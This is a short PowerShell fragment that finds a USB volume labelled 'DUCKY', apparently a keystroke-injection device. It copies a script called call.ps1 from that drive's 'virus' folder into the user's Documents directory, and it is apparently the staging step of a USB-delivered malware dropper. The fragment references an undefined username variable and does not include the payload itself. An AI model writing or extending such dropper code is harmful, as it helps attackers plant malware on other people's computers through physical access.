$driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='DUCKY'").DriveLetter
$callPathBeforeCopy = Get-ChildItem -Path $driveLetter\virus -Recurse -Filter "call.ps1"
$callMoveDir = "C:\Users\$localUsername\Documents\virus\Virus\call.ps1"

Copy-Item -Path $callPathBeforeCopy -Destination $callMoveDir